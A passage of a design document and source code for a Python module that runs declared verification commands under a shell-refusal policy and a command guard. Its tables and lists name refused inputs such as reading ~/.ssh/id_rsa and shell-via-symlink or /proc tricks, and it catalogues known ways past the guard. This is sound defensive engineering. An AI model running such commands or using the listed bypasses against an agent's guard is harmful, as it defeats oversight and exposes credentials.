| more than 50 gates | `more than 50 gates` |
| a gate is not an object, has a key outside `id command argv shell timeout_s cwd` | `gate N must be an object` / `gate N has an unknown key` (N counts from 1) |
| `id` not 1-64 ASCII chars from letters, digits, `.`, `_`, `-`, starting with a letter or digit | `gate N: id must be ...` |
| not exactly one of `command` (string) and `argv` (list of strings) | `gate N needs exactly one of command and argv` / `command must be a string` / `argv must be a list of strings` |
| `shell` present and not a JSON boolean (`"false"`, `1`, `null` all refused: the reference's `bool(...)` would make `"false"` truthy, `:160`) | `gate N: shell must be true or false` |
| `shell: true` together with `argv` | `gate N: shell needs command, not argv` |
| `timeout_s` present and not a number in (0, 1800] (bool, string, NaN, Infinity, 1e999, a 400-digit int all refused) | `gate N: timeout_s must be a number above 0 and at most 1800` |
| `cwd` present and not a string | `gate N: cwd must be a string` |
| two gates with the same `id` | `duplicate gate id` |

Defaults: `timeout_s` 300, `cwd` `"."`, `shell` false. There is no regex in the module: ids are checked with `str.isascii/isalnum`, so no ReDoS surface of its own (`test_the_module_has_no_regex`).

### 3. argv: how a string becomes argv without a shell

`command` (string form), non-shell gates:

1. `text = raw.strip()`; longer than 4,096 characters -> policy error `command is too long` (bounds everything after).
2. Any character of `; & | ` $ < > \n \r` anywhere in `text`, quotes included -> policy error `shell metacharacters; use argv, or declare shell: true and pass --allow-shell`. This is exactly the reference's set (`service.py:136`) applied to the raw text before tokenising (`:175`), including its stated consequence that a `;` inside quotes needs `shell: true` (`test_verification.py:214-221`). A NUL is NOT in this set; it is refused one step later (step 5), so each rule has its own test and mutant.
3. `shlex.split(text)` (POSIX mode, `comments=False`): `ValueError` (unbalanced quote, trailing backslash) -> policy error `could not tokenize the command (...)`. The exception text is not echoed.
4. The result is the argv. Its edge cases, all pinned by tests:

| input | result | why |
|---|---|---|
| `"  pytest   -q  "`, tab-separated, trailing newline | `("pytest","-q")` | strip, then shlex whitespace |
| `ruff check "src tests" scripts` | 4 items, `src tests` one item | quoting works |
| `echo "" x` | `("echo","","x")` | empty items inside argv are legal |
| `pytest tests/test_*.py` | the glob stays literal | no glob expansion without a shell; the tool or the exit code decides |
| `ls ~`, `echo {a,b}`, `echo (x)`, `pytest # c` | `~`, `{a,b}`, `(x)`, `#`, `c` literal | no tilde, brace or comment handling |
| `python C:\x\y.py` | `("python","C:xy.py")` | POSIX backslash escape; use the list form for such paths |
| `pytest -k a=b`, `--maxfail=1` | accepted | only argv[0] is checked for `=` |
| `""`, `"" x`, `''` | policy error `empty executable` | |
| empty or whitespace-only | policy error `empty command` | |
| `-q pytest` | policy error `the executable starts with '-'` | almost surely a typo; shells never run an option |
| `A=b pytest`, `PATH=x python` | policy error `the executable contains '=' (...)` | without a shell the prefix would be run as a program name; the guard strips such prefixes and checks the REAL command, so refusing them closes a mismatch between what is checked and what is run |
| a NUL byte | policy error `argument contains a NUL byte` | `execve` cannot carry it |
| a lone surrogate (`"\ud800"`, `"\udcff"`) | policy error `argument is not valid text` | `\udcff` would otherwise be smuggled as raw byte 0xFF by `os.fsencode` |
| `\x01`..`\x1f` other than tab/newline/CR | refused by the guard as `unparseable` | `safety.py:93`, `:531` |

`argv` (list form): items are used VERBATIM (`("echo","a;b","$HOME","","~","*")` runs exactly that). Rules: non-empty, at most 256 items, each at most 4,096 characters, no NUL, encodable as UTF-8, `argv[0]` non-empty, not starting with `-`, without `=`. No metacharacter rule applies because nothing interprets them.

**Refused although harmless (false positives of the string form; the way out is the list form):** `python -c 'import sys; sys.exit(0)'` (a `;` in quotes), `grep -E 'a|b' f`, `pytest -k 'a&b'`, `echo $HOME` (nothing would expand it), `git log --format=%H > out`, any URL with `&`, any command line containing a newline. **False negatives** (not caught, by design): interpreters running code (`python -c "import os; os.system(...)"` in the list form), because the rule is about accidental shell syntax, not about what a program does.

### 4b. A shell is not a non-shell gate (rev 2, ATK1)

Applied in `plan_gate` after the argv rules AND the cwd fence (rev 3: the child resolves `argv[0]` from the gate's cwd, so the check needs it) and before the guard, and ONLY when `gate.shell` is false (a declared shell gate's own argv is `("/bin/sh", "-c", raw)` and must not be refused: the judge's first placement broke 11 tests, here `test_the_shell_check_never_runs_on_a_declared_shell_gate_argv` and `test_a_declared_shell_gate_still_runs_through_sh_when_allowed` pin it). Rules, each with its own tests and mutants:

| rule | matching | examples refused |
|---|---|---|
| R1 shell names | the basename of `argv[0]` (text after the last `/`, lower-cased, a trailing `.exe` removed) is one of `sh bash dash ash ksh mksh pdksh posh yash zsh fish csh tcsh rbash` (14; `fish` and `csh` are not POSIX shells but are shells) | `sh -c ...`, `/bin/sh`, `BASH`, `bash.exe`, `C:/tools/SH.EXE`, `./sh`, string forms `sh -c id`, `'sh' -c id`, `dash` |
| R2 resolution | the same test on the basename of what the child's exec will find, resolved FROM THE GATE'S cwd (rev 3): the physical walk (`_walk`, rev 3c: no `normpath`, no `realpath`) of `join(cwd, argv[0])` when `argv[0]` contains `/` (absolute words stay absolute), else the first executable regular file along PATH (`os.get_exec_path()`; an empty or relative entry means the gate's cwd; the hit is walked BEFORE the file test, rev 3c D1c): a symlink with any name that points at a shell is refused when reached by an absolute path, a cwd-relative path or PATH; `/proc` and `/dev` are refused outright (R5) | `gate-runner -> /bin/sh` by absolute path, by relative path `./mysh` from a different runner folder, and by bare name on an absolute, relative or empty PATH entry |
| R3 shell-running programs | `su` and `watch` as the executable (they start a shell by design) | `su -c a`, `watch ls` |
| R4 one-hop wrappers | the basename of `argv[0]` is one of 29 wrappers (`env xargs busybox toybox nohup exec command builtin sudo doas timeout nice ionice setsid stdbuf chroot find flock unshare strace time chrt taskset script runuser setpriv nsenter ssh parallel`) AND ANY later argument has a shell basename (R1 rule) | `env sh`, `env A=1 bash`, `busybox sh -c`, `xargs -I{} sh -c {}`, `find . -exec sh -c ... ;`, `find . -execdir /bin/bash`, `nohup sh`, `sudo -u x sh`, `timeout 5 sh -c`, `nice -n 5 bash` |
| R5 `/proc` and `/dev` (rev 3b, walk in 3c) | every component of the physical walk of the executable path (a link's target is read with `readlink` and walked, never followed through `/proc`; a `..` that a target brings is applied to the folder reached), every PATH entry and the PATH hit up to the first hit is `/proc`, `/dev` or below (see Revision 3b, ATK5): policy error `the executable is under /proc or /dev, which the runner and the child resolve differently`; non-shell gates, `argv[0]` only; more than 40 links: `the executable path has a link loop or more than 40 links` | `/proc/self/cwd/mysh`, `/proc/thread-self/cwd/mysh`, `/proc/self/cwd/./mysh`, `/proc/<pid>/cwd/mysh`, `/proc/self/root/bin/sh`, `/proc/self/fd/3`, `/dev/fd/3`, `/dev/stdin`, `/dev/null`, `/dev/shm/tool`, `//proc/...`, a PATH entry `/proc/self/cwd`, `d -> /dev` then `d/fd/0`, a link target that climbs with `..` to `/proc/self/cwd/mysh`, a PATH hit `d1/tool -> /proc/self/cwd/mysh` |
| R6 `..` (rev 3c) | any `..` path component in `argv[0]` or in a PATH entry that the search reaches, checked on the RAW text before anything is joined or normalised (`../x`, `a/../b`, `lnk/../mysh`, a PATH entry `lnk/..`); policy error `the executable path has a '..' component, which a link on the way makes ambiguous`; the text is not echoed | `lnk/../mysh` with `lnk -> /proc/self/cwd`, absolute `D/sub/lnk/../mysh`, `./lnk/../mysh`, string form `lnk/../mysh -c x`, `../mysh` (cost: a harmless `..` is refused too) |

Not refused (tests `test_ordinary_programs_are_not_mistaken_for_shells`): `pytest -k bash` (only `argv[0]` and wrapper arguments are looked at), `python -c`, `env A=1 pytest`, `env python -V`, `find . -name x`, `timeout 5 pytest`, `shellcheck`, `bash-completion`, `fishfood`, `sh.py`, `ssh-keygen`, `busybox ls`. Known false positives (any wrapper argument whose last path component is a shell name): `find . -name sh`, `find . -path "*/bash"`, `timeout 5 pytest tests/shell/sh`, `time pytest -k sh`, `env FOO=1 pytest -k sh` style arguments equal to a shell name after a wrapper (rename the argument or use a script). Known non-detections (Decision 3c): a wrapper not on the list, a wrapper chain behind a wrapper that is not given the shell name directly (`env env sh` IS caught because any later argument counts; `env X=sh`-style obfuscation, `sh` built by a program, `python -c`, `perl -e`, `awk`, `node -e`, `make SHELL=...`), and any script. A tripwire cannot close this; it removes the accidental and the obvious case, which is what the QA-bar row (a) "runs a shell when not declared" asks of the string and list forms. The refusal text names the way out and never echoes the command (`test_a_refusal_never_echoes_the_command_or_cwd`, mutants H18, H19). The check walks the path with `islink`, `readlink`, `isfile` and `access` on text that already passed the NUL/size/encoding rules; an `OSError` from it is a refusal (`the executable path could not be examined`, rev 3c) and any other exception is still the plan's fail-closed `policy check failed`.

### 4. `shell: true`

Honoured only when ALL hold: the gate declares the JSON boolean `true`; the gate uses `command` (not `argv`); the string is non-blank and at most 4,096 characters; the caller passed `--allow-shell` (`run_gates(..., allow_shell=True)`); `os.name == "posix"`. The spawn is `["/bin/sh", "-c", raw]` through the same `stream_process` (Popen is still called with a list and without `shell=True`); the metacharacter scan does not apply (that is the opt-in), NUL/size/encoding checks do, the guard sees the raw text (so `sh -c` nesting and `&&` chains are inspected, `safety.py:526-543`), and the cwd fence applies. `"shell": false` with a metacharacter is still refused (`test_verification.py:70-73`, `test_shell_false_with_metacharacters_is_still_refused`). Windows: `shell gates need a POSIX shell` (test with `os` faked).

### 5. Policy order and policy errors

`plan_gate(gate, ws, allow_shell) -> Plan | str` (the str is the reason). Order: shell preconditions or string parsing -> argv rules -> cwd fence -> shell refusal (non-shell gates, 4b; rev 3: after the cwd fence) -> guard. Any unexpected exception inside it is `policy check failed` (fail closed; the exception text is not kept). `run_gates` plans EVERY gate first. If any plan is a str: the report holds `policy-error` for those gates (with their reason) and `not-run` for all others, `Popen` is never called, exit 2. The reference instead appends an error step (returncode -1) and continues with the remaining commands (`service.py:2097-2106`); a half-run list hides which gates were skipped and a refused gate means the file is wrong, so this design stops everything. Refusal messages never contain the command, the argument or the cwd text (`test_a_refusal_never_echoes_the_command_or_cwd`, mutants Q31-Q35); the guard's denial text already has that property (`safety.py:567-571`).

### 6. Guard and sensitive-path reuse (decision: reuse by import, and the consequences)

`guard_tool_call(ToolCall("gate","gate",{"command": line, "cwd": str(cwd)}))` where `line` is `shlex.join(argv)` for non-shell gates and the raw text for shell gates. This is the function the agent loop runs (`evals/runner.py:33,158`), so the command tripwire (`safety.py:526-543`: fork bombs, recursive delete of roots, force-push to main, pipe-to-interpreter, ...) and the credential-path denylist (`sensitive_paths.py`, applied word by word to the command and by the `cwd` key to the folder, `safety.py:34-54`, `:605-615`) both apply. Consequences, stated so nobody is surprised: (a) a gate such as `git push --force origin main` or `cat ~/.ssh/id_rsa` is a policy error, never a run; (b) a gate whose cwd is inside `~/.ssh`, `~/.aws`, `~/.kube`, `~/.config/gcloud` is refused even when `--root` is broad enough to contain it; (c) the guard caps a command line at 10,000 characters (`safety.py:29`, `:529`), which with 256 items x 4,096 is reachable only through the list form and is refused as `too-long`; (d) it is a speed bump, not a sandbox (`safety.py:3-8`): `python -c "..."` bodies are not inspected; (e) the guard realpath-resolves path words against the PROCESS cwd, not the gate cwd, so a relative symlink in a gate argument is judged from the wrong folder (see Does not cover); (f) importing it makes the module POSIX-only, which it already was (`sensitive_paths.py:4-7`). `make_guard(policy)` is not used: it only adds an allowlist mode that gates do not have.

### 7. The cwd fence

`Workspace(root).check_read(gate.cwd)` (`workspace.py:148-149`): lexical rejection (empty, NUL, over 1,024 characters, `//host` and drive paths, invalid characters, reserved device names, a component ending in a dot or space), `resolve()`, then `is_relative_to(root)`. Read mode is used on purpose: write mode refuses the root itself (`workspace.py:136`) and the default cwd is the root. A symlink inside the root that points outside resolves outside and is refused; `..` that stays inside is fine. The resolved folder must exist and be a folder, else `cwd is not a folder`. The refusal text carries the fence's own `reason` (a constant) and never the path. The fence is checked at plan time and the child starts later: a swap in between is a TOCTOU window, accepted (a fence, not a sandbox, `workspace.py:10-11`). The fence says where the child STARTS; nothing stops a gate's argv from naming a path elsewhere.

### 8. The spawn

`stream_process(argv, env=scrubbed_env(), timeout_s=t, cwd=str(plan.cwd))` then `collect(...)` (`stream.py:118-141`, `:214-226`): `Popen` with a list and no shell; env minus every variable whose NAME contains KEY, PASSWORD, SECRET or TOKEN case-insensitively (`stream.py:22,30-35`; values under innocent names are NOT scrubbed); `stdin=DEVNULL`; `start_new_session=True`; stdout and stderr read by two threads into bounded tail buffers of 64,000 bytes each, whatever the child prints; at the deadline the whole process group gets SIGKILL (`stream.py:76-87`; idea from `references/deepseek_harness/packages/subprocess/subprocess-local/src/spawn.ts:260-264`, `:358`). The reference's `subprocess.run` passes none of these (`service.py:2109-2116`: inherited env and stdin, one 1,800 s timeout that kills only the direct child, unbounded capture). A SIGTERM, SIGHUP or SIGINT delivered to the runner unwinds through the same `finally`, so the gate's group is killed too (`_signals_raise`, `test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass`; the first draft orphaned the child on SIGTERM and SIGHUP). SIGKILL cannot be handled. The only edit to `stream.py` is the `cwd` keyword. A grandchild that keeps the pipes open after the child exits is reported as `timeout`, never `pass` (test `test_a_daemonised_grandchild_holding_the_pipe_is_a_timeout_not_a_pass`).

### 9. Status semantics and exit-code mapping

| status | when | exit_code field |
|---|---|---|
| `pass` | the child exited with code 0 (printing nothing is fine: the exit code is the verdict, as in the reference `:2122`) | 0 |
| `fail` | any other exit code, including killed by a signal (negative, message `killed by signal N`) | the code |
| `timeout` | the deadline passed (outranks an exit code, even 0) | null |
| `error` | the process could not be started or run: not found / not executable / any other `Exception` (message `could not start (TypeName)`, never the text) / no exit status | null |
| `policy-error` | refused by the policy; nothing spawned | null |
| `not-run` | another gate was refused, or the total time budget was used up | null |

Gate-level to process-level: exit 0 only for a non-empty all-`pass` list; `policy-error` anywhere -> 2; otherwise 1. `KeyboardInterrupt` is not caught anywhere (`except Exception`). The reference maps a timeout to `error` (`:2141`) and a missing executable to `error` (`:2127`); here the timeout has its own status so a reader can tell a hang from a crash.

### 10. Bounds

| bound | value | enforced where | on breach |
|---|---|---|---|
| gates per file | 50 | `load_gate_file` | exit 2 |
| file size | 262,144 B | `load_gate_file` | exit 2 |
| command string / argv item | 4,096 chars | plan | `policy-error` |
| argv items | 256 | plan | `policy-error` |
| guard line | 10,000 chars | guard | `policy-error` (`too-long`) |
| per-gate timeout | default 300 s, max 1,800 s (the reference's constant, `:2116`) | schema + `min(gate, remaining)` | `timeout` |
| total time | 3,600 s | `run_gates(total_s)`: `remaining = deadline - now`; `<= 0` -> `not-run`; the running gate gets `min(timeout_s, remaining)` | `not-run` / `timeout`, exit 1 |
| capture per stream | 64,000 B (tail) | `collect` | `truncated: true` |
| report tail per stream | 4,000 chars of the REDACTED text (the reference's number, `:2123`) | `_tail` | `truncated: true` |

Worst case wall time is 3,600 s plus the kill and join (about 5 s per gate, `stream.py:26,198-208`).

### 11. Report schema and the C4 interaction

```json
{"schema_version": 1, "kind": "gates",
 "gates": [{"id": "unit", "status": "pass", "exit_code": 0, "duration_s": 0.123,
            "stdout_tail": "...", "stderr_tail": "", "truncated": false, "message": ""}],
 "passed": 1, "failed": 0, "total": 1, "ok": true}
```

Key order is fixed (`test_report_schema_and_key_order`). The report holds the gate id, never the command, argv, cwd or env (`test_the_report_never_contains_the_command_or_the_env`). Both tails go through `redact_secrets` (the C3 rule table) BEFORE the cut, so a secret straddling the cut cannot leave a fragment (`test_redaction_happens_before_the_tail_is_cut`). It is deliberately NOT a C4 report: no `results` key, no `case_id`, so `load_baseline` and `runner.main --baseline` reject it with exit 2 (`test_a_gate_file_is_not_a_c4_baseline`, run on the real CLI output) and a gates report can never be mistaken for a benchmark baseline. A gates run has no baseline or regression compare in this item (Does not cover). The one place the two meet is code: `_stdout_lost` is imported from the runner.

### 12. Determinism

Gates run strictly in declared order, one at a time; there is no set or dict iteration in the output path; ids are checked with a set but only for membership. Two runs of the same file give identical reports except `duration_s` (`test_same_file_same_report_apart_from_durations`), and ordering mutants F19-F22 are run under PYTHONHASHSEED 0-39. Tails depend on what the child prints; a child that prints a timestamp is not deterministic, which is the gate author's property.

### 13. Platform notes (UNVERIFIED unless a test proves it)

Linux: all tests run. macOS: same POSIX calls (`start_new_session`, `killpg`, `/bin/sh`), no test run on it: UNVERIFIED. Windows: `tools/sensitive_paths.py` opens with `O_PATH`/`dir_fd` and "fails loudly" off POSIX (`:4-7`), so `import master_finhub.evals.gates` fails there; `stream.py:79-82` has a non-POSIX branch that is marked `pragma: no cover`; both UNVERIFIED and unsupported. The one proven non-POSIX behaviour is the `shell gates need a POSIX shell` refusal, with `os` faked.

### 14. Python-version triggers (the C8 lesson)

Every trigger that depends on interpreter limits was identified and run on 3.11, 3.12 and 3.13 (results in Proof): (1) deep JSON nesting: a 250,000-`[` file (under the size cap, so the parser really sees it) must give exit 2 on every version, `RecursionError` on 3.11, the C-recursion guard on 3.12/3.13; the 5,000-digit int is refused by the int-string limit on all three; (2) NUL and lone surrogates: pre-checked in Python so `Popen`'s `ValueError`/`UnicodeEncodeError` is never the line of defence; (3) hash seeds: ordering mutants only; (4) `typing.Self` in the tests exists since 3.11; (5) child-process buffering: tests never rely on a flush that `os._exit` would skip, and the CLI default-root test runs with `PYTHONUNBUFFERED` unset AND set.

### 15. Quant correctness (evals/verifiers touched)

Gates run commands and read an exit code; they compute no returns, scores or splits. All six rows of `quant-guardrails.md` are `N/A` for the module itself (N24). Stated limit: a gate that runs a backtest is only as good as that backtest: the gate runner cannot see fees, borrow, slippage, look-ahead, survivorship or train/test leakage inside the command it runs, and an exit code of 0 from a leaky backtest is a `pass`. Quant checks belong in the command (a gate that fails when a synthetic look-ahead feature scores perfectly), not here.

### 16. Licence

OpenHarness is MIT (`references/openharness/LICENSE:1-3`, upstream org unverified, the flag every OH-primary row carries). The module docstring carries the attribution line `adapted from references/openharness/src/openharness/autopilot/service.py:155 (MIT)`; no file-level copy; an automated 8-word check of `gates.py`, `test_gates.py` and `stream.py` against the reference service and test file found only the import line `from pathlib import Path` / `from typing import Any` (not prose).

## The code

### A. `src/master_finhub/evals/gates.py` (new, 561 lines, in full)

```python
"""Verification gates as data: a declared list of command gates, run as argv; a shell only when
the gate declares it and the caller allows it.

Policy adapted (MIT, own code) from references/openharness/src/openharness/autopilot/service.py:155
(string or mapping entry, argv unless the entry opts in, a policy error is never executed), the
metacharacter set at :136 and the spawn and status mapping at :2094. Own code: a strict JSON
schema, every gate checked before anything is spawned, the workspace fence for cwd, the command
guard, a scrubbed env, per-gate and total time bounds, and redacted output tails.

What is and is not controlled. This module starts /bin/sh itself only for a gate that declares
``"shell": true`` AND is run with ``--allow-shell``; the string form never turns into a shell by
itself. In a non-shell gate a shell as the executable (sh, bash, dash, ...), or a symlink to one
reached by an absolute path, a cwd-relative path or PATH (resolved from the gate's folder), su,
watch, or a wrapper handed a shell (env sh, xargs sh, find -exec sh, ...) is refused; so is any
executable under /proc or /dev, which the runner and the child resolve differently, and any
executable word or examined PATH entry with a '..' component (checked on the raw text: after a link
it names a different file than a lexical fold does). The path is resolved one component at a time,
physically, with no normalisation. That is a
speed bump that catches common accidents, NOT a sandbox: each audit round found another
path-resolution mismatch of the same class, and others may exist. NOT detected: wrappers not on
the list, wrapper chains, interpreters (``python -c``, ``perl -e``, ``awk``, ``node -e``), make,
scripts, a copy or hard link of a shell, a link made by an earlier gate, programs that start a
shell without naming one (flock -c, script -c, runuser -c, parallel, sudo -s, env -S), an
executable earlier on PATH that exec skips (no shebang, a missing interpreter) before a same-name
shell link, and shells outside the 14 listed names (ksh93, elvish, nu, xonsh, versioned names).

Exit codes of ``python -m master_finhub.evals.gates``: 0 every gate passed; 1 a gate failed, timed
out, could not start or was not run; 2 the gate file is unusable or a gate broke the policy
(nothing was spawned); 143 (SIGTERM), 129 (SIGHUP) or a SIGINT death: interrupted, no report, the
running gate's process group killed (SIGKILL of the runner itself cannot be handled). Gates are
trusted operator data: this fences accidents, it is not a sandbox.
"""

from __future__ import annotations

import argparse
import contextlib
import json
import os
import shlex
import signal
import sys
import time
from collections.abc import Iterator, Sequence
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any, Final, Literal

from master_finhub.evals.runner import _stdout_lost
from master_finhub.runtime.loop import ToolCall
from master_finhub.sandbox.stream import collect, scrubbed_env, stream_process
from master_finhub.sandbox.workspace import SandboxDenied, Workspace
from master_finhub.tools.safety import guard_tool_call
from master_finhub.tools.secret_scan import redact_secrets

SCHEMA_VERSION: Final = 1
MAX_GATES: Final = 50
MAX_FILE_BYTES: Final = 262_144
MAX_TEXT_CHARS: Final = 4096  # one command string, or one argv item
MAX_ARGV_ITEMS: Final = 256
DEFAULT_TIMEOUT_S: Final = 300.0
MAX_TIMEOUT_S: Final = 1800.0
MAX_TOTAL_S: Final = 3600.0
TAIL_CHARS: Final = 4000  # per stream in the report (stream.collect keeps 64,000 before this)
SHELL_METACHARS: Final = frozenset(";&|`$<>\n\r")
SHELL_PATH: Final = "/bin/sh"
OPAQUE_ROOTS: Final = ("/proc", "/dev")
HANDLED_SIGNALS: Final = (signal.SIGTERM, signal.SIGHUP)
# Shell names (lower case, ".exe" stripped) refused as the executable of a non-shell gate.
SHELL_NAMES: Final = frozenset(
    {
        "sh",
        "bash",
        "dash",
        "ash",
        "ksh",
        "mksh",
        "pdksh",
        "posh",
        "yash",
        "zsh",
        "fish",
        "csh",
        "tcsh",
        "rbash",
    }
)
# One-hop wrappers refused when ANY later argument names a shell; and programs that run a shell
# by design, refused outright. Not exhaustive: a wrapper chain cannot be closed by a tripwire.
WRAPPERS: Final = frozenset(
    {"env", "xargs", "busybox", "toybox", "nohup", "exec", "command", "builtin", "sudo", "doas", "timeout",
     "nice", "ionice", "setsid", "stdbuf", "chroot", "find", "flock", "unshare", "strace", "time", "chrt",
     "taskset", "script", "runuser", "setpriv", "nsenter", "ssh", "parallel"}
)  # fmt: skip
SHELL_RUNNERS: Final = frozenset({"su", "watch"})
ROOT_KEYS: Final = frozenset({"schema_version", "gates"})
GATE_KEYS: Final = frozenset({"id", "command", "argv", "shell", "timeout_s", "cwd"})
Status = Literal["pass", "fail", "timeout", "error", "policy-error", "not-run"]


class GateFileError(ValueError):
    """The gate file is unusable. The message never echoes the file's contents."""


@dataclass(frozen=True)
class Gate:
    id: str
    command: str | None
    argv: tuple[str, ...] | None
    shell: bool
    timeout_s: float
    cwd: str


@dataclass(frozen=True)
class GateResult:
    id: str
    status: Status
    exit_code: int | None
    duration_s: float
    stdout_tail: str
    stderr_tail: str
    truncated: bool
    message: str


@dataclass(frozen=True)
class GateReport:
    gates: tuple[GateResult, ...]
    passed: int
    failed: int
    total: int
    ok: bool


@dataclass(frozen=True)
class Plan:
    argv: tuple[str, ...]
    cwd: Path


def _unique_keys(pairs: list[tuple[str, Any]]) -> dict[str, Any]:
    out = dict(pairs)
    if len(out) != len(pairs):
        raise ValueError("duplicate JSON key")
    return out


def _bad(why: str) -> GateFileError:
    return GateFileError(f"Gate file: {why}. Fix the gate file and retry.")


def _valid_id(value: object) -> bool:
    return (
        isinstance(value, str)
        and 0 < len(value) <= 64
        and value.isascii()
        and value[0].isalnum()
        and all(c.isalnum() or c in "._-" for c in value)
    )


def _timeout(value: object) -> float | None:
    if isinstance(value, bool) or not isinstance(value, (int, float)):
        return None
    try:
        seconds = float(value)
    except OverflowError:
        return None
    return seconds if 0 < seconds <= MAX_TIMEOUT_S else None  # False for NaN, inf, 0 and below


def _parse_gate(n: int, entry: Any) -> Gate:
    if not isinstance(entry, dict):
        raise _bad(f"gate {n} must be an object")
    if not set(entry) <= GATE_KEYS:
        raise _bad(f"gate {n} has an unknown key")
    if not _valid_id(entry.get("id")):
        raise _bad(f"gate {n}: id must be 1-64 ASCII letters, digits, '.', '_' or '-'")
    command, argv = entry.get("command"), entry.get("argv")
    if (command is None) == (argv is None):
        raise _bad(f"gate {n} needs exactly one of command and argv")
    if command is not None and not isinstance(command, str):
        raise _bad(f"gate {n}: command must be a string")
    if argv is not None and not (isinstance(argv, list) and all(isinstance(a, str) for a in argv)):
        raise _bad(f"gate {n}: argv must be a list of strings")
    shell = entry.get("shell", False)
    if not isinstance(shell, bool):
        raise _bad(f"gate {n}: shell must be true or false")
    if shell and command is None:
        raise _bad(f"gate {n}: shell needs command, not argv")
    timeout = _timeout(entry["timeout_s"]) if "timeout_s" in entry else DEFAULT_TIMEOUT_S
    if timeout is None:
        raise _bad(f"gate {n}: timeout_s must be a number above 0 and at most {MAX_TIMEOUT_S:g}")
    cwd = entry.get("cwd", ".")
    if not isinstance(cwd, str):
        raise _bad(f"gate {n}: cwd must be a string")
    return Gate(entry["id"], command, None if argv is None else tuple(argv), shell, timeout, cwd)


def load_gate_file(path: str | os.PathLike[str]) -> tuple[Gate, ...]:
    """Strict load: anything unusable raises GateFileError (fail closed, never an empty list)."""
    if not os.path.isfile(path):  # follows symlinks; a FIFO or device would block on read
        raise _bad("not a regular file")
    try:
        with open(path, "rb") as fh:
            raw = fh.read(MAX_FILE_BYTES + 1)
    except OSError:
        raise _bad("cannot be read") from None
    if len(raw) > MAX_FILE_BYTES:
        raise _bad(f"larger than {MAX_FILE_BYTES} bytes")
    try:
        data = json.loads(raw.decode("utf-8"), object_pairs_hook=_unique_keys)
    except (ValueError, RecursionError):  # includes bad UTF-8 and duplicate keys
        raise _bad("not UTF-8 JSON (duplicate keys and very deep nesting are refused)") from None
    if not isinstance(data, dict) or not set(data) <= ROOT_KEYS:
        raise _bad("the root must be an object with only schema_version and gates")
    version = data.get("schema_version")
    if type(version) is not int or version != SCHEMA_VERSION:  # not a bool, not 1.0
        raise _bad(f"schema_version must be {SCHEMA_VERSION}")
    rows = data.get("gates")
    if not isinstance(rows, list) or not rows:
        raise _bad('"gates" must be a non-empty list')
    if len(rows) > MAX_GATES:
        raise _bad(f"more than {MAX_GATES} gates")
    gates = tuple(_parse_gate(i, row) for i, row in enumerate(rows, 1))
    if len({g.id for g in gates}) != len(gates):
        raise _bad("duplicate gate id")
    return gates


def _argv_from_string(raw: str) -> tuple[str, ...] | str:
    """A command string -> argv, or the reason it is refused. Metacharacters are scanned on the
    raw text, quotes included, before shlex sees it (conservative, like the reference)."""
    text = raw.strip()
    if len(text) > MAX_TEXT_CHARS:
        return "command is too long"
    if any(ch in SHELL_METACHARS for ch in text):
        return "shell metacharacters; use argv, or declare shell: true and pass --allow-shell"
    try:
        return tuple(shlex.split(text))
    except ValueError:
        return "could not tokenize the command (unbalanced quote or trailing backslash)"


def _argv_refusal(argv: Sequence[str]) -> str | None:
    if not argv:
        return "empty command"
    if len(argv) > MAX_ARGV_ITEMS or any(len(a) > MAX_TEXT_CHARS for a in argv):
        return "argv is too long"
    if any("\x00" in a for a in argv):
        return "argument contains a NUL byte"
    try:
        for a in argv:
            a.encode("utf-8")
    except UnicodeEncodeError:
        return "argument is not valid text"
    if not argv[0]:
        return "empty executable"
    if argv[0].startswith("-"):
        return "the executable starts with '-'"
    if "=" in argv[0]:
        return "the executable contains '=' (environment prefixes need shell: true)"
    return None


def _base(word: str) -> str:
    name = word.rsplit("/", 1)[-1].lower()
    return name.removesuffix(".exe")


class _Refused(Exception):
    """The executable's path cannot be resolved the way the child will: the message is the reason."""


OPAQUE_MSG: Final = (
    "the executable is under /proc or /dev, which the runner and the child resolve differently"
)
DOTDOT_MSG: Final = (
    "the executable path has a '..' component, which a link on the way makes ambiguous"
)
LOOP_MSG: Final = "the executable path has a link loop or more than 40 links"


def _opaque(path: str) -> bool:
    return any(path == root or path.startswith(root + "/") for root in OPAQUE_ROOTS)


def _no_dotdot(path: str) -> None:
    """Checked on the RAW text, before any normalisation: a lexical ``..`` after a symlink names a
    different file than the kernel's (the link's target's parent), so it is refused, not folded."""
    if ".." in path.split("/"):
        raise _Refused(DOTDOT_MSG)


def _walk(path: str) -> str:
    """Resolve the absolute ``path`` one component at a time, physically, like the kernel, WITHOUT
    following anything under /proc or /dev (the runner and the child see different things there):
    entering either raises _Refused. Returns the resolved path. ``path`` itself has no ``..`` (the
    word is refused first); one can come from a link's target, and is applied to the folder
    reached so far, which holds no link and no ``..``, so its parent is exact."""
    todo = path.split("/")[::-1]
    cur, links = "/", 0
    while todo:
        part = todo.pop()
        if part in ("", "."):
            continue
        if part == "..":
            cur = os.path.dirname(cur)  # "/" stays "/", as in the kernel
            continue
        nxt = os.path.join(cur, part)
        if _opaque(nxt):
            raise _Refused(OPAQUE_MSG)
        if os.path.islink(nxt):
            links += 1
            if links > 40:
                raise _Refused(LOOP_MSG)
            target = os.readlink(nxt)
            if target.startswith("/"):
                cur = "/"
            todo.extend(target.split("/")[::-1])  # a relative target starts from the link's folder
            continue
        cur = nxt
    return cur


def _resolve(word: str, cwd: Path) -> str | None:
    """Where the child's exec will find ``word``. The child starts in ``cwd`` (the gate's folder,
    not the runner's), so a path with a "/" is joined onto it, and a bare name is searched along
    PATH the way Popen does: first entry holding an executable file, an empty or relative entry
    meaning ``cwd``. A ``..`` component (in the word or an examined PATH entry), and anything under
    /proc or /dev (also reached through a link), raises _Refused before any normalisation.
    Not looked at: a file created or swapped after this check (an earlier gate), and an earlier
    PATH file that exec skips for another reason (no shebang, a missing interpreter)."""
    _no_dotdot(word)
    if "/" in word:
        return _walk(os.path.join(cwd, word))
    for entry in os.get_exec_path():
        _no_dotdot(entry)
        base = _walk(os.path.join(cwd, entry))
        candidate = _walk(os.path.join(base, word))  # a hit that is a link into /proc is refused
        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return candidate
    return None


def _shell_refusal(argv: Sequence[str], cwd: Path) -> str | None:
    """Non-shell gates only. Refuse a shell as the executable (by its name, and by what a path or a
    PATH lookup resolves to FROM THE GATE'S cwd, so a symlink called anything that points at a
    shell is caught), a shell-running program, and a one-hop wrapper handed a shell name."""
    first = _base(argv[0])
    names = {first}
    try:
        found = _resolve(argv[0], cwd)
        if found:
